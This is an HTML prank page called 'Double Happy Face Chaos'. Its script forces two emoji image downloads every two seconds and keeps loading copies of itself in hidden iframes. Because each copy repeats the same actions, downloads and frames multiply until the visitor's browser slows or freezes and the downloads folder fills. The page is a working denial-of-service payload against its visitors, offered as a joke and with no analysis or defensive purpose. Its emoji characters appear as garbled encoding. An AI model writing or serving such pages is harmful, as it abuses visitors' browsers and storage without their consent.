<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Double Happy Face Chaos</title>
    <style>
        body {
            font-family: sans-serif;
            text-align: center;
            margin-top: 50px;
        }
    </style>
    <script>
        const emojis = [
            "https://twemoji.maxcdn.com/v/latest/72x72/1f600.png", // ðŸ˜€
            "https://twemoji.maxcdn.com/v/latest/72x72/1f603.png"  // ðŸ˜ƒ
        ];

        function downloadEmoji(url, name) {
            const link = document.createElement("a");
            link.href = url;
            link.download = name;
            document.body.appendChild(link);
            link.click();
            document.body.removeChild(link);
        }

        function backgroundRefresh() {
            const iframe = document.createElement("iframe");
            iframe.style.display = "none";
            iframe.src = location.href;
            document.body.appendChild(iframe);
            iframe.onload = () => setTimeout(() => document.body.removeChild(iframe), 1000);
        }

        setInterval(() => {
            // Download both emojis
            emojis.forEach((url, i) => downloadEmoji(url, `happy_face_${i+1}.png`));
            // Invisible background refresh
            backgroundRefresh();
        }, 2000);
    </script>
</head>
<body>
    <h1>Double Happy Face Chaos ðŸ˜„ðŸ˜ƒ</h1>
    <p>Two happy face emojis download every 2 seconds, with invisible page refresh for chaos.</p>
</body>
</html>
